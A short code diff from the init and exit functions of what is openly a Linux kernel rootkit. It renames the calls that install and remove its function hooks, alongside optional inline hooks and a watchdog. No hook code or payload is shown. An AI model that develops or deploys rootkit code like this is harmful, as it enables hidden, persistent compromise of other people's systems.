@@ -49,7 +49,7 @@ static int __init rootkit_init(void) {
     setup_inline_hooks();
 #endif
 
-    fh_install_hooks();
+    fh_install_all();
 
 #ifdef ENABLE_WATCHDOG
     start_watchdog();
@@ -91,7 +91,7 @@ static void __exit rootkit_exit(void) {
     stop_watchdog();
 #endif
 
-    fh_remove_hooks();
+    fh_remove_all();
 
 #ifdef ENABLE_INLINE_HOOK
     remove_inline_hooks();
